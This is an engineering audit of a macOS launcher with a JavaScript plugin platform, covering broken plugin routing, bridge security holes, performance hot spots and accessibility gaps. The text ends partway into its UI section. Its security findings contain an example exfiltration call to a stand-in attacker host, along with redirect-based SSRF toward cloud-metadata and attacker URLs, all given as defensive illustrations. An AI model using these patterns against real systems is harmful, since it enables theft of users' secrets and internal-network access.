# Vee — Multi-Faceted Engineering Audit

> **REMEDIATION STATUS (2026-06-26):** All P0 findings (ARCH-1/2/3, SEC-1/SEC-2/SEC-INERT, PERF-1/2/3, MAC-1) and the tracked P1s (SEC-3/4/6, UI-1/2, UX-2/5/7, PLT-1/2) have been fixed and verified — see the "Audit remediation" section at the top of [STATUS.md](STATUS.md). The findings below are the original point-in-time report; do not action them without checking current source. PERF-3's debounce/diff-reload sub-items were intentionally deferred (documented in STATUS.md); UX-1 (Esc→root) remains a follow-up.

*Audited 2026-06-26 against the working tree at `HEAD` = `69608e7` **plus uncommitted changes** (1,213 insertions across 11 tracked files + new untracked plugin samples `api/github/jira/meetings/snippets`). Build verified clean (`swift build`, one warning); test suite verified **168 executed, 1 skipped, 0 failures** (`swift test`) + ~34 node tests. This audit reads the live code, not the docs — `docs/STATUS.md` and `docs/ARCHITECTURE.md` claims were treated skeptically and cross-checked against source.*

**Method:** seven parallel specialist passes (macOS/Swift, architecture, security, UI, UX/accessibility, performance, plugin-platform/testing), each producing file-and-line-cited findings, followed by central verification of the highest-impact claims (the two architecture Criticals, the menubar gap, the test totals, and the production provider wiring were re-read in source by the orchestrator).

---

## 1. Executive summary

Vee is a **native macOS launcher (Swift 6 / SwiftPM, macOS 14+) with a JavaScriptCore plugin platform**, modeled faithfully on Raycast. Its **engine core is genuinely excellent** — a frozen JSON-RPC wire contract, an RFC-6902 JSON-Patch implementation with LIS-minimal moves, an fzy-style fuzzy matcher with reused buffers, disciplined JSC memory management (the "two rules" are not just followed but *asserted by tests*), and a clean protocol-seam architecture where ~90% of logic sits above mockable OS boundaries. The test rigor on the libraries is security-grade (capability-deny paths assert the backend is *never touched*).

**But the app around that core does not yet deliver the product.** The headline gap is concentrated and, once understood, decisive:

> **The plugin-surfacing path — the entire reason for the JSC platform — is non-functional in the shipped binary, broken independently in three places.** Any one of these alone would break it:
> 1. **The launcher's `AppCoordinator` is hardwired to `pluginId: "com.vee.launcher"`** (`Sources/vee/main.swift:115`), a `let` that is never retargeted, while plugins activate under their real ids. Every `plugin.render` is dropped at the id filter (`AppCoordinator.swift:143`). *(verified in source)*
> 2. **Only the last-loaded plugin can receive host→plugin events.** `PluginInstance.init` overwrites the transport's single `onReceive` slot (`PluginInstance.swift:110`); the host installs its multiplexer once at init (`PluginHost.swift:73`) and never re-installs it after `load()`. With 3 plugins loaded, the host router and the first two instances are clobbered. *(verified in source)*
> 3. **Every privileged plugin bridge is a no-op/deny default in production.** `main.swift` constructs `PluginHost` with only the real HTTP client; `open`/`openApp`/`keychain`/`fs`/`clipboard`/`calendar`/disk-storage all fall back to `RecordingOpenProvider`/`DenyingFileProvider`/`InMemorySecretStore`/`EmptyCalendarProvider`/etc. (`PluginHost.swift:52-57`). So even if a plugin rendered, the `clipboard`, `github`, `jira`, `meetings` samples cannot perform their core action. *(verified in source)*

The "live plugin render proof" in `STATUS.md` works only in **snapshot mode**, where the coordinator's id is set to match the single loaded plugin (`main.swift:46`) and the rendered plugin (`essentials`) is a static list needing no providers.

**Net verdict.** The repo is an **A-grade engine core and wire contract with a B-grade native shell wrapped around a plugin pipeline that is currently disconnected end-to-end.** The host-native **app-search launcher** (type → fuzzy-filter → ↩ to launch) is real and close to good; the **plugin platform** is wired but inert. Security posture is acceptable *today only because the dangerous providers are no-ops* — the bridge design itself is missing capability gates that must be closed before any real provider is wired. Accessibility is effectively absent. Performance has the right architecture but two concrete per-keystroke hot spots.

### Severity tally (deduplicated, this document)

| Domain | Critical | High | Medium | Low/Info |
|---|---|---|---|---|
| Architecture & correctness | 2 | 2 | 3 | 3 |
| Security & privacy | 2† | 3 | 4 | 4 |
| Performance | 3 | 2 | 2 | 2 |
| UX & accessibility | 2 | 5 | 6 | 5 |
| UI & visual | 1 | 1 | 4 | 5 |
| macOS/Swift practices | 0 | 3 | 3 | 3 |
| Plugin platform / testing | 0 | 2 | 3 | 3 |

† Security Criticals are **design defects that are latent in the shipped binary** (provider is a no-op) but become live the instant a real provider is wired — see §4.

### What to fix first (the 30-second version)

- **P0 — make plugins work at all:** retarget the coordinator per active plugin (or drop the id filter); stop `PluginInstance` from clobbering the host's `onReceive`; wire the real providers in `main.swift`.
- **P0 — close the bridge security holes *before* wiring real providers:** gate `vee.open`/`vee.openApp` behind capabilities; re-validate the network allowlist on redirects; restrict fetch schemes/SSRF.
- **P0 — kill the per-keystroke jank:** cache resolved icons; use the already-built `PreparedCandidate` fast path instead of re-normalizing 5,000 candidates per keystroke.
- **P1 — make it usable & honest:** populate the menubar menu (no Quit today); add escape-to-root from a plugin; surface toasts/errors; add accessibility labels; render Markdown in the detail pane.

---

## 2. Verification basis (what the orchestrator confirmed first-hand)

| Claim | Result |
|---|---|
| `swift build` | ✅ clean; 1 warning (`unused try?`, `main.swift:55`) |
| `swift test` | ✅ **168 executed, 1 skipped, 0 failures** (STATUS claims "155" — stale) |
| Coordinator `pluginId` is a `let`, filter drops mismatches | ✅ `AppCoordinator.swift:35,103,143` |
| Host multiplexer clobbered by instance | ✅ `PluginHost.swift:73` set once; `PluginInstance.swift:110` overwrites; not re-installed in `load()` |
| `setMenuBarItems` never called | ✅ only the definition + protocol decl exist |
| Production providers are no-op/deny defaults | ✅ `PluginHost.swift:52-57`; `main.swift:105-112` passes only the real HTTP client |
| `vee.open`/`openApp` have no capability flag | ✅ `BridgeMethods.swift:6-12` self-documents the gap |

Severity legend: **Critical** = breaks the product or an exploitable/blocking security hole · **High** = significant correctness/security/UX defect, blocks a quality release · **Medium** = real, should fix · **Low/Info** = polish, nit, or latent.

---

## 3. Cross-cutting headline findings

### H1 · [Critical] The plugin pipeline is broken end-to-end in the shipped app (three independent causes)
Detailed as **ARCH-1**, **ARCH-2**, and **SEC-INERT** below. The combination means: a user pressing ⌥Space → "Clipboard History" → ↩ activates a plugin that (a) renders into a coordinator that discards the render, (b) cannot receive the user's subsequent keystrokes/actions if it isn't the last-loaded plugin, and (c) couldn't read the clipboard anyway because the provider denies. The app-search path (no plugin) works; the plugin path does not. **This is the #1 thing to fix and it is not reflected in the top-line STATUS claims.**

### H2 · [Critical→latent] The bridge security model has real holes that are masked only by no-op providers
`vee.open`/`vee.openApp` are completely ungated (SEC-1/SEC-2); the network allowlist isn't re-checked on redirects (SEC-3); fetch has no scheme/SSRF restriction (SEC-4). Today these are **not exploitable in the shipped binary** because `openProvider` is a `RecordingOpenProvider` no-op and the in-process design means there's no isolation to escape *to* — but `URLSessionHTTPClient` **is** real, so the network findings are **live for any loaded plugin** (e.g. `hacker-news`). The gates must be added *before* `NSWorkspaceOpenProvider`/`KeychainStore`/`FileManagerFileProvider` are wired into `main.swift`, which the design clearly intends.

### H3 · [Critical] Two per-keystroke hot spots contradict the "instant" value prop
Icon rasterization (PERF-1) and candidate re-preparation (PERF-2) both run, uncached, on every keystroke on the main thread, at up to 5,000-candidate scale. The architecture to avoid both already exists in the codebase (`InMemoryLRUStorage`, `FuzzyMatcher.match(query:inPrepared:)`) but is not wired on the hot path.

---

## 4. Security & privacy

> **Threat model evaluated:** a malicious-but-author-reviewed plugin running JS in an **in-process** `JSContext` inside the host's address space. The only claimed boundary is "capability gating at the bridge." Findings assess whether that gate is present, correct, and unbypassable. **Crucial context:** the design is sound-ish *on paper* but several bridges ship ungated; they are inert today only because `main.swift` wires no-op providers (`PluginHost.swift:52-57`).

### SEC-1 · [Critical — design; latent in current binary] `vee.open(url)` is ungated — arbitrary `file://`/scheme open + network-allowlist-bypass exfiltration
- **Where:** `Sources/VeeEngine/JSBridge.swift:622-647` (`handleOpen`, explicitly *not* capability-gated, comment at :624-629), `Sources/VeeEngine/Bridges.swift:506-516` (`NSWorkspaceOpenProvider.open` does `URL(string:) ?? URL(fileURLWithPath:)` → `NSWorkspace.shared.open`), `BridgeMethods.swift:6-12`.
- **Issue:** A plugin with `network: []` can still exfiltrate any secret it can read: `vee.open("https://attacker.com/leak?d=" + token)` — the default browser performs the GET, completely bypassing the network allowlist. It can also open arbitrary `file://` URLs and absolute paths (defeating `fs` confinement) and trigger dangerous custom schemes (`x-apple.systempreferences:`, `vnc://`, `ssh://`, app deep links). The "opening is the launcher's whole job" rationale conflates the *user/host* opening things with *arbitrary plugin code* doing so unattended.
- **Status:** Latent — `openProvider` defaults to `RecordingOpenProvider` (records, doesn't open). Becomes Critical-live the moment `NSWorkspaceOpenProvider` is wired.
- **Fix:** Add an `open` capability (scheme + optional host allowlist; default-deny). Reject `file:`/non-`http(s)` unless explicitly granted; confine `file://` to declared `fs` roots. Migrate `open`/`openApp` into `RPCMethods` and delete `BridgeMethods.swift`.

### SEC-2 · [Critical — design; latent] `vee.openApp(bundleId)` launches arbitrary apps, ungated
- **Where:** `JSBridge.swift:649-667` (`handleOpenApp`, no capability check), `Bridges.swift:518-526` (`NSWorkspace.openApplication`).
- **Issue:** `vee.openApp("com.apple.Terminal")` launches any installed app, unconsented. Chained with scheme handlers (SEC-1) this becomes a foothold for driving other apps.
- **Fix:** Gate behind a per-plugin bundle-id allowlist; default-deny.

### SEC-3 · [High — live] Network allowlist checked only on the initial URL; cross-origin redirects are followed unchecked (SSRF / exfiltration)
- **Where:** `JSBridge.swift:394-402` (gate on initial `URL(string:)?.host`), `Bridges.swift:102-134` (`URLSessionHTTPClient` uses `URLSession.shared` with **no** redirect delegate).
- **Issue:** `URLSession.shared` auto-follows 3xx, including cross-origin. A plugin granted `network: ["api.github.com"]` reaching any open-redirect on that host can be bounced to `http://169.254.169.254/…` (cloud-metadata SSRF), `http://localhost:port/…`, or `https://attacker.com/collect?d=<exfil>` — the follow-up request and body return to the plugin, never re-checked. **This is live** because the HTTP client is the one real provider in production.
- **Fix:** Install a `URLSessionTaskDelegate` that re-applies `allowsNetworkHost` to every redirect target (return `nil` to refuse), or disable auto-redirect and surface 3xx to the plugin.

### SEC-4 · [High — live] No scheme/SSRF protection on `vee.http.fetch`
- **Where:** `JSBridge.swift:368-418`, `Bridges.swift:106-133`.
- **Issue:** The gate is a host-string allowlist only — no `https`-only enforcement, no block on `file:`/`ftp:` schemes, no rejection of loopback/link-local/private ranges, and DNS-rebinding is viable (the allowlist matches the hostname string; resolution happens later in `URLSession`).
- **Fix:** Enforce `https`-only (allow `http` per-host opt-in), reject non-HTTP schemes at the bridge, and reject/repin resolved private/loopback/link-local addresses.

### SEC-5 · [High] In-process JSContext = no isolation, no resource governor, ambient user authority
- **Where:** `PluginInstance.swift:79-116` (context in-process), `packaging/Info.plist` (no sandbox), `scripts/package-app.sh:39` (ad-hoc sign, no hardened runtime/entitlements).
- **Issue:** The spec promised per-process isolation; reality runs each plugin in-process. Consequences: (a) any bridge logic bug is a *full* compromise, not a contained one; (b) **no CPU/memory/wallclock governor** — a plugin can `while(true){}` to wedge its serial queue or allocate to OOM; (c) ad-hoc signed with no App Sandbox / hardened runtime / entitlements, so the host (and thus every plugin) runs with the user's full ambient authority.
- **Fix:** Document clearly that this is **language-level gating, not a security boundary** (plugins are fully trusted). For real isolation, move plugins out-of-process behind the existing JSON-RPC transport into a sandboxed XPC service with per-instance watchdogs. At minimum enable hardened runtime.

### SEC-6 · [Medium] Keychain uses `kSecAttrAccessibleWhenUnlocked` (migrates in backups)
- **Where:** `Sources/VeeKeychain/SecretStore.swift:165,210`.
- **Issue:** Plugin OAuth tokens / API keys end up in encrypted backups and migrate to a restored/new device. `…ThisDeviceOnly` is the right class for these.
- **Fix:** Use `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`.

### SEC-7 · [Medium] Plugin identity is a self-declared, unauthenticated manifest `id` — the keychain/storage isolation key is spoofable
- **Where:** `PluginInstance.swift:347-365` (pluginId bound natively — *good*), but the `id` originates from `PluginManifest.id` loaded by `host.load` from `samples/*/vee.json` with no signing/identity binding (`main.swift:149-152`, bundler keys `dist/<manifest.id>.js`).
- **Issue:** The per-plugin keychain namespace (`com.vee.<pluginId>.<ns>`), storage, and support folder are all keyed off an attacker-choosable `id`. A malicious plugin can **claim another plugin's `id`** to read its secrets. Latent today (the three ids are hardcoded), but the pipeline is built to key security on an unauthenticated value.
- **Fix:** Bind identity to a code signature or a trusted install registry; reject duplicate ids at load.

### SEC-8 · [Medium] `vee.clipboard.history` exposes full plaintext history to any plugin with the coarse `clipboard` boolean
- **Where:** `JSBridge.swift:480-516`, `Sources/VeeServices/Clipboard.swift:229-254`.
- **Issue:** The capture-time privacy filter (good — see Strengths) drops concealed/transient/password-manager UTIs, but *everything that survives* (the entire non-concealed history — site passwords without the UTI, 2FA codes, private messages) is fully readable by any plugin holding one boolean. No per-item, time-box, or "current item only" tier. Paired with SEC-1's exfil path this is a vacuum-and-leak. (Latent: provider is `DenyingClipboardProvider` in production.)
- **Fix:** Split the capability into "read current item" vs "read full history"; consider entropy/OTP/credit-card redaction even when no UTI is set.

### SEC-9 · [Medium] Plugin disk storage / fs writes are plaintext with no file protection
- **Where:** `Sources/VeeCache/DiskStorage.swift:36-41` (`.atomic` only, no `NSFileProtection`), `Bridges.swift:616-648`.
- **Issue:** Anything a plugin stashes via a disk-backed `vee.storage` or `vee.fs` lands in cleartext readable whenever the volume is mounted; no encryption-at-rest. (Latent: production `vee.storage` is `InMemoryStorage`; `fs` is `DenyingFileProvider`.)
- **Fix:** Write with `.completeFileProtection`; document `vee.storage` is not for secrets (direct to `vee.keychain`).

### SEC-10 · [Low] fs confinement is lexical (`standardizingPath`) with a TOCTOU symlink gap; production provider doesn't re-confine
- **Where:** `PluginInstance.swift:388-408` (`resolveConfinedPath`), `Bridges.swift:637-648` (`FileManagerFileProvider` does *no* re-confinement; only the test `TempDirFileProvider` does).
- **Issue:** A plugin with a writable root can plant a symlink inside it pointing out, then write through it — the lexical pre-write check stays "inside," the actual write follows the link out.
- **Fix:** Resolve the real path (`realpath`/`O_NOFOLLOW`) on the final target + parent; re-assert confinement in the production provider.

### SEC-11 · [Low] Fetch URL is parsed twice independently (gate vs client); userinfo/edge-case divergence; unbounded console/toast strings
- **Where:** `JSBridge.swift:394` vs `Bridges.swift:107`; console/toast at `JSBridge.swift:93-131,359-364`.
- **Fix:** Canonicalize once at the gate, reject userinfo/`@` hosts, pass the validated `URL` through. Cap log/toast lengths and attribute toasts to the originating plugin id.

**No JS-injection sinks found** — every `evaluateScript` uses constant function bodies with data passed via `call(withArguments:)`; the exception handler is installed before any eval. Supply chain is clean: `node_modules` git-ignored, lockfile has no pre/post-install scripts, esbuild runs with `external:[]` (no runtime `require`), `platform:"neutral"`.

---

## 5. Architecture & code quality

### ARCH-1 · [Critical] Single coordinator hardwired to `com.vee.launcher` discards every real plugin's render
- **Where:** `main.swift:115` (`pluginId: "com.vee.launcher"`) vs `AppCoordinator.swift:35` (`let pluginId`), `:143` (`if let pid = …, pid != pluginId { return }`); plugins activate under real ids at `main.swift:176`.
- **Issue:** One coordinator, bound for life to an id no plugin uses. `plugin.render`/`plugin.setCandidates` carry the plugin's real id → filtered out → the plugin surface never reaches the window. *Verified in source.*
- **Fix:** Make `pluginId` mutable and retarget on activation, OR drop the filter and route by active plugin, OR one coordinator per active plugin. Add a non-snapshot test that activates a command and asserts the window receives the surface.

### ARCH-2 · [Critical] `PluginInstance.init` clobbers the host's inbound multiplexer — only the last plugin gets host→plugin events
- **Where:** `PluginInstance.swift:110-115` (sets `transport.onReceive`), `PluginHost.swift:73-76` (host sets multiplexer once at init), `load()` at `:102-138` creates instances *after* and never re-installs.
- **Issue:** The transport has one `onReceive` slot. After loading 3 plugins, only `hacker-news` (last) receives `invokeAction`/`onSearchTextChange`/`submitForm`; the host router and the other two are dead. The comment at `PluginInstance.swift:104-109` claims the host "overrides this" — the override order is inverted. *Verified in source.*
- **Fix:** Don't let `PluginInstance` touch a host-owned transport's `onReceive` (pass an ownership flag), or re-install the host multiplexer after each `load()`, or give each instance its own endpoint. Add a multi-plugin inbound-routing test.

### ARCH-3 · [High] Render revision is per-mirror but the coordinator's `lastRevision` is process-lifetime → a reloaded/re-activated plugin's renders are dropped as stale
- **Where:** `RenderMirror.swift:24,43-47` (revision starts at 0 per mirror; one per instance), `AppCoordinator.swift:63,166` (`lastRevision` only increases). Reload builds a fresh mirror restarting at 1.
- **Issue:** After the coordinator advances to revision N, a hot reload / re-activation / command switch creates a mirror restarting at 1; `1 > N` is false, so the first whole-tree render and several after are silently dropped — blank/stale surface, no error.
- **Fix:** Reset `lastRevision` on active-plugin/command change (hook the existing `hostCandidateMode` reset), or carry an `epoch` in `RenderParams` and key ordering on `(epoch, revision)`.

### ARCH-4 · [High] `JSONValue.number` is `Double`-only — integer ids and large/precise numbers corrupt across the boundary
- **Where:** `Sources/VeeProtocol/JSONValue.swift:16,27` (all numbers → `Double`); used for every prop/candidate/patch operand and `JSONRPCID`.
- **Issue:** Integers beyond ±2⁵³, ms timestamps, ids-as-numbers, money lose precision the moment a plugin payload crosses `JSONBridge`. `Hashable` on `Double` also makes patch `test`/identity sensitive to `-0.0` vs `0.0` and NaN (NaN ≠ NaN → a NaN node always diffs). A latent correctness hole in a "frozen contract."
- **Fix:** Document/enforce the ±2⁵³ limit and forbid NaN/Inf in `JSONBridge`; if integer fidelity matters, add an `.int` case or carry the lexical form; guard `diff`/`test` against NaN.

### ARCH-5 · [Medium] The "CONTRACT GAP": `vee.open`/`vee.openApp` live entirely outside the frozen contract (no method, no capability, ungated)
- **Where:** `BridgeMethods.swift:6-18` (local strings outside `RPCMethods`), `RPCMethods.swift` (no `open`/`openApp`), SDK exposes them anyway (`runtime.ts:162-164`).
- **Issue:** The clearest sign the frozen-contract discipline became a *hindrance*: a legitimately needed capability couldn't be added cleanly, so it was routed around. The two constants are also currently dead (in-process, never sent over the wire). Overlaps SEC-1/2 on the security side.
- **Fix:** Treat as the forcing function to "unfreeze" — add to `RPCMethods` + `Capabilities`, gate like fetch, delete `BridgeMethods.swift`.

### ARCH-6 · [Medium] `deactivate` is a no-op that leaks timers and lets stale plugins keep rendering
- **Where:** `PluginHost.swift:152-156` (only clears `activeCommand`; instance, `setInterval` timers, event subscriptions, and `vee.render` ability stay live).
- **Issue:** "Deactivate" doesn't quiesce the plugin. A late `vee.render` from a "deactivated" plugin still mutates the surface; its timers keep firing.
- **Fix:** Cancel the instance's timers and stop honoring its outbound renders on deactivate; gate `dispatch`/`routeInbound` on `activeCommand`.

### ARCH-7 · [Medium] Doc-comments assert invariants the code doesn't uphold (comment-as-noise)
- **Where:** `PluginInstance.swift:104-109` (inverted multiplexer claim, see ARCH-2), `PluginHost.swift:184-185` (`reloadValue` computed then `_ = reloadValue`; `plugin.reload` JS dispatch is never delivered, so the documented `ReloadParams.state` rehydration at `RPCMethods.swift:20-21` is unimplemented).
- **Issue:** Several long, authoritative-sounding comments mislead because they read as documentation. The codebase generally over-comments; a few of those comments are now wrong.
- **Fix:** Either implement `plugin.reload` JS dispatch or downgrade the comments to "not yet wired." Prefer tests over prose for load-bearing invariants.

### ARCH-8 · [Low] Empty-string identity collapses keyless list items; `RenderMirror` desync-on-apply-failure; triple-duplicated JSON round-trip coder
- **Where:** `ViewModels.swift:205-209` (`""` identity), `RenderMirror.swift:51-59` (on apply failure sets `mirror = tree` but still ships the original patch → permanent host/launcher mirror divergence), `RPCTransport.swift:121-131` + `Transport.swift:45-57` + `AppCoordinator.swift:412-415` (three copies of `Encodable→JSONValue→Decodable`).
- **Fix:** Synthesize positional ids for keyless items; on apply failure emit a whole-tree `replace ""` to resync; hoist one `JSONValueCoder` into VeeProtocol.

---

## 6. Performance

> The architecture is right (fetch-once, filter-natively, minimal patches). The defects are two un-wired fast paths and one debug round-trip left on in release.

### PERF-1 · [Critical] Synchronous, uncached icon rasterization per visible row, every keystroke
- **Where:** `AppKitAdapters.swift:741-760` (`resolveIcon`) ← `configure` :733 ← `tableView(_:viewFor:)` :593 ← `reloadData()` :356 (fires on every keystroke via `setQuery`→`pushToWindow`→`setRootViewModel(.list)`).
- **Issue:** For each of ~10–11 visible rows, on every keystroke: `FileManager.fileExists` (stat) + `NSWorkspace.icon(forFile:)` (Launch Services) + fresh `NSImage` `lockFocus`/draw/`unlockFocus` rasterization — **with no cache**. "Safari" is re-stat'd and re-rasterized on every keypress; `updateFooter` adds one more. Easily milliseconds/keystroke — the dominant main-thread cost, directly against the "sub-frame" goal.
- **Fix:** Cache the final 26pt `NSImage` by path (use the existing `InMemoryLRUStorage`), resolve at ingest on the background enumeration thread, and drop the manual lockFocus (let `NSImageView` scale the multi-rep icon). *Note: PERF/UI both flag that the "2× pre-rasterized for crispness" comment at :740 is false — the draw is at 1× into a 1× canvas (`px` is computed then discarded, `_ = px` :749), so HiDPI gets a soft 1× raster.*

### PERF-2 · [Critical] The full candidate set is re-normalized (Unicode fold + boundary masks) every keystroke — the `PreparedCandidate` cache the code was built around is never used
- **Where:** `FuzzyMatching.swift:22-24` → `FuzzyMatcher.swift:32` (`candidates.map { PreparedCandidate($0) }`); the designed hot-path API `match(query:inPrepared:)` is dead because the coordinator passes raw `[Candidate]` (`AppCoordinator.swift:287`).
- **Issue:** Every keystroke rebuilds, for all up-to-5,000 apps, `precomposedStringWithCanonicalMapping` + `.lowercased()` + two `Array(unicodeScalars)` + a per-char boundary scan — before any scoring. The 10k-candidate test exercises `match` but asserts no latency, so it stays green while masking this.
- **Fix:** Hold `[PreparedCandidate]`, rebuilt only in `showHostCandidates`/`applyCandidates` (once per open), and call `match(query:inPrepared:)` per keystroke. The code already supports this.

### PERF-3 · [Critical] Whole-set filter + view-model rebuild + full `reloadData` on the main thread per keystroke, no cap/debounce
- **Where:** `AppCoordinator.swift:265-327` (`setQuery`→`refilter`→`projectHostCandidates`), scoring/sorting *all* 5,000 then rebuilding the whole list and reloading the whole table.
- **Issue:** The launcher only ever shows ~10 rows, yet every keypress sorts all candidates and rebuilds every `ListItemViewModel`. With PERF-1/PERF-2 stacked, this is where frames drop.
- **Fix:** Score into a bounded top-K heap (no full sort); debounce/coalesce keystrokes; diff the visible list and reload only changed rows; drop the `Array(scored)` copy of the `ContiguousArray`.

### PERF-4 · [High] Every host↔plugin frame is JSON-serialized 3–4× (loopback codec round-trip left on in release)
- **Where:** `Transport.swift:47-56`, `RPCTransport.swift:114-131`, `LoopbackTransport.send:75-91` ("to genuinely speak the wire contract").
- **Issue:** One notification: `encode`→`decode(JSONValue)` then `RPCCodec.encode`→`decode`. Fires per keystroke for server-side-filtering commands and over the whole array for `setCandidates`. Deliberate fidelity check, but pure overhead in the in-process build.
- **Fix:** Gate the codec round-trip behind `#if DEBUG`/`assert`; pass through directly in release. Collapse the double-hop where the payload is already a `JSONValue`.

### PERF-5 · [High] JSC marshalling stringifies the whole render tree (`JSON.stringify`/`parse`) every render, recompiling the helper each call
- **Where:** `JSONBridge.swift:18-50` (re-evaluates `(function(x){return JSON.stringify(x)})` per call); invoked from `handleRender:349`, `handleSetCandidates:354`, every event dispatch.
- **Fix:** Cache the stringify/parse helper `JSValue`s once per context; walk small event payloads structurally to skip the string hop.

### PERF-6 · [Medium] `vee.storage` is an unbounded dict that ignores TTL; the whole VeeCache (SWR/LRU/Disk) layer is dormant
- **Where:** `Bridges.swift:182-186` (`InMemoryStorage.set` discards `ttlSeconds`, `store[key]=value`), wired as default at `PluginHost.swift:52`; no `SWRCache`/`InMemoryLRUStorage`/`DiskStorage` instantiated outside `Sources/VeeCache/`.
- **Issue:** Unbounded growth for any plugin caching per-query (memory leak); the well-built cache layer is dead weight that overstates the caching story.
- **Fix:** Back `vee.storage` with `InMemoryLRUStorage` + honor TTL, or cap keys and drop expired in `get`.

### PERF-7 · [Medium] N `JSVirtualMachine`+`JSContext` created synchronously on the main thread at launch (eager, never torn down)
- **Where:** `main.swift:146-158` → `PluginHost.load` → `PluginInstance.init:79-116`; each plugin gets a full JS heap on the time-to-first-keystroke path; instances retained for process life.
- **Fix:** Lazy-load plugin bundles on first activation (or off-main, mirroring the app-search pattern); tear down inactive instances (the no-leak teardown path already exists).

*(Low/Info: redundant double `drainMicrotasks` (`evaluateScript("")`) after each callback; `JSONPatch.diffArrayGeneral` is O(n·m) LCS for churning keyless lists; `highlightedTitle` rebuilds an `NSAttributedString` per visible row — all bounded, fix after the Criticals.)*

---

## 7. UX, interaction & accessibility

### UX-1 · [Critical] No way back to root from an activated plugin — the launcher is a dead end
- **Where:** `main.swift:172-184` ("keep the launcher open"), `AppKitAdapters.swift:618` (Esc → `hideLauncher` everywhere), `showRoot` only called from the hotkey re-open `main.swift:205`.
- **Issue:** Once inside a plugin, the only exit is Esc (dismisses the whole window) then re-press ⌥Space. No back affordance, no breadcrumb, no escape-to-root. (Compounded by ARCH-1, which means you can't get *into* a working plugin anyway.)
- **Fix:** Context-aware Esc — first Esc on a plugin surface calls `showRoot()` (clear the field), second Esc on root hides. Optional back chevron in the header.

### UX-2 · [Critical] Assistive tech cannot use the launcher — zero accessibility labeling
- **Where:** `AppKitAdapters.swift` rows/footer/search; grep confirms **no** `setAccessibilityLabel`/`isAccessibilityElement`/`accessibilityRole` anywhere in `Sources/`.
- **Issue:** Custom `NSTableCellView` rows expose no composed label, role, or selected-state to VoiceOver; icon/subtitle/accessory/footer caps are unlabeled. A VoiceOver user hears fragments and cannot tell what's selected or actionable — excluded from the core task of a keyboard-first launcher.
- **Fix:** Per row: `isAccessibilityElement = true`, `setAccessibilityLabel("\(title), \(subtitle), \(accessory)")`, role description ("command"/"application"), reflect selection; label the search field; post `selectedChildrenChanged` on move; mark decorative icons non-accessible.

### UX-3 · [High] Menubar menu is empty — no Quit, no Open, no hotkey hint; the only exit is Ctrl-C
- **Where:** `AppKitAdapters.swift:933-941` (`setMenuBarItems` builds an empty menu and is **never called** — verified), `.accessory` app with no Dock icon (`main.swift:218`).
- **Issue:** Clicking the status item opens a blank menu. A normal user cannot quit, discover ⌥Space, or rebind — they must use Activity Monitor. Fundamental for an always-on utility.
- **Fix:** Populate "Open Vee (⌥Space)", a disabled hotkey hint, and "Quit Vee (⌘Q)" → `NSApp.terminate`.

### UX-4 · [High] "Actions ⌘K" is presentational; secondary actions are completely unreachable
- **Where:** `AppKitAdapters.swift:840-841` (cluster always shown), key routing `:615-624` has no ⌘K and only `actions.first` is ever invoked (`:43,537`); `MANUAL-VERIFY.md:76` confirms it's not wired.
- **Issue:** Every screen advertises an actions panel that does nothing — a discoverability trap that erodes trust. Items carry multiple `actions` (e.g. Clipboard "↩ copies") that are unreachable; no `⌘↩` secondary, no per-action shortcut dispatch.
- **Fix:** Wire a real actions popover (list `selectedItem.actions`, ↑↓/↩, Esc to dismiss) or hide the cluster until it exists. Add `⌘↩` → secondary action in the interim.

### UX-5 · [High] Plugin toasts and errors are silently dropped — no user-visible error surface
- **Where:** `AppCoordinator.swift:150-152` (`case .toast: break`, `.log: break`), `LauncherWindowPresenting` (`Seams.swift`) has no toast method; activation/render failures swallowed (`activate` is `try?` `main.swift:176`; `applyRender` drops failed patches).
- **Issue:** The whole toast pipeline exists but terminates in a no-op — a plugin reporting a network failure produces zero UI. Combined with in-process (no crash isolation), a misbehaving plugin fails completely silently (blank surface, no explanation).
- **Fix:** Add `presentToast` to the window seam, implement a transient banner (style by `ToastParams.Style`), route the coordinator's `toast` case to it; add a generic plugin-error state.

### UX-6 · [High] Slow/cold open shows a blank list (no loading state), and type-ahead yields a false "No Results"
- **Where:** `main.swift:167-186` (apps enumerated off-main; candidates pushed only on completion), `AppCoordinator.swift:311-315` (empty state keyed on `!query.isEmpty`). `RootViewModel` has no `.loading` case.
- **Issue:** Hitting ⌥Space during enumeration shows an empty body; typing then flips to "No apps or commands match 'x'" — actively lying while the index loads.
- **Fix:** Show the (synchronously-available) command rows immediately and append apps when ready, or render "Loading applications…"; gate the empty state on a `candidatesLoadedAtLeastOnce` flag.

### UX-7 · [High] Reduce Motion is ignored — the show animation always plays
- **Where:** `AppKitAdapters.swift:453-490` (unconditional fade + 6pt rise + scale); no `accessibilityDisplayShouldReduceMotion` check anywhere.
- **Fix:** Skip the offset/scale (or plain ≤0.1s cross-fade) when Reduce Motion is set. (Hide is already instant — good.)

### Medium / Low (UX)
- **UX-8 [Med]** No arrow wrap-around, Page Up/Down, Home/End, or ⌃N/⌃P — incomplete list nav (`AppCoordinator.swift:339`, `AppKitAdapters.swift:615`).
- **UX-9 [Med]** No ⌘1..9 quick-launch.
- **UX-10 [Med]** No Dynamic Type / text-size support — all fonts hardcoded in the `UI` enum (`AppKitAdapters.swift:14-28`); panel/row sizes fixed.
- **UX-11 [Med]** Increase Contrast / Reduce Transparency not honored against the `.sidebar` vibrancy; the accent selection (alpha 0.11 dark) is already a low-contrast *selection* indicator.
- **UX-12 [Med]** Low-contrast `tertiary`/`quaternary` label colors carry actionable info (shortcuts, accessory, footer caps) on translucency — likely fails WCAG AA.
- **UX-13 [Low]** ⌥Space conflicts with non-breaking-space insertion and is undiscoverable (no menu, no recorder, no onboarding); registration failure only goes to stderr (invisible to a GUI user) — `main.swift:199-210`.
- **UX-14 [Low]** Focus ring suppressed with no alternative AT focus cue; detail state has no Esc-to-list.

---

## 8. UI & visual design

*(Screenshots in `docs/screenshots/` were read directly. Caveat **UI-3**: they're produced by `writeSnapshot`, which paints a flat opaque grey behind the layer cache — they do **not** show the real `.sidebar` vibrancy, so the "8.6/10 ship-bar" was graded on a fudged surface. Realistic live grade ≈ 7.5/10 until the items below close.)*

### UI-1 · [Critical] Plugin detail body renders raw, unparsed Markdown in a plain `NSTextView`
- **Where:** `AppKitAdapters.swift:399` (`detailTextView.string = detail.markdown`); no Markdown parser exists.
- **Issue:** The list/detail/empty projection to native surfaces is otherwise genuinely good (real `ViewModelProjector` → typed `setRootViewModel` switch, not the old flat string). But a plugin emitting `# Heading\n**bold**\n- bullet` shows literal hashes/asterisks/brackets as flat 13pt text — the regression at exactly the surface where rich content lives.
